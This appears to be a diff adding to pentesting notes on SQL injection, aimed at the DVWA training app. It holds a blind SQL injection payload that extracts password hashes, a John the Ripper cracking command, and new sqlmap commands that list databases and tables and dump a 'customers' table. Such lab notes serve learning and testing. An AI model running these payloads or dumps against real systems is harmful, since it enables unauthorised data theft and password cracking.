@@ -101,3 +101,10 @@ john passwords.txt --show --format=raw-MD5
 # meaning the password has the string 5f
 ' union select password,sleep(2),'' from dvwa.users where password like "5f%" #
 ```
+### SQLMap tool
+```bash
+sqlmap -u 10.0.0.3?id=1
+sqlmap -u 10.0.0.3?id=1 -dbms=mysql --dbs
+sqlmap -u 10.0.0.3?id=1 -dbms=mysql -D api --tables
+sqlmap -u 10.0.0.3?id=1 -dbms=mysql -D api -T customers --dump
+```
